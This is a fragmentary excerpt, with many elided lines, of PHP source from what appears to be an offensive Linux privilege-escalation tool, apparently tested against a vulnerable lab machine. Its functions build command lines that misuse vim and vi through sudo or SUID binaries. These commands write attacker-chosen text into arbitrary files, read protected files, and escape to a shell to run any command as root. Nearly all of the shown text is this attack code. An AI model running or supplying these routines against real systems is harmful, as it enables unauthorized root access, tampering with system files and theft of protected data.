...
L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
	...
	public function elf4root2write($sudo,$userpass,$write2what,$write2where){
	    ...
	    switch ($this->file_name){
	        ...
	        case "vim":
	        case "vim.basic":
	            $data = "$this->file_path \"+normal! G\" \"+normal o$write2what\" \"+wq!\"  $write2where ";
	...
	public function elf4root2read($sudo,$userpass,$file2read){
	    ...
	    switch ($this->file_name){
	        ...
	        case "vim":
	        case "vim.basic":
	            $data = "$this->file_path $file2read  \"+q!\" ";
	            $data_sudo = "$via_sudo $this->file_path $file2read ";
...
!$via_suid  -c  '$cmd' ";
	            ...
	            case "vi": // OK lin.Security
	                $data = "$this->file_path -c \":! $via_suid -c '$cmd'\" /tmp/text.tmp 2> /dev/null ";
	                $data_sudo = "$via_sudo $data";	                
	                break ;
	            ...
	            case "vim":
	            case "vim.basic":
	                $data = "$this->file_path -c \":! $via_suid -c '$cmd'\"  \"+q!\" /tmp/text.tmp 2> /dev/null ";
	                $data_sudo = "$via_sudo $data";	 
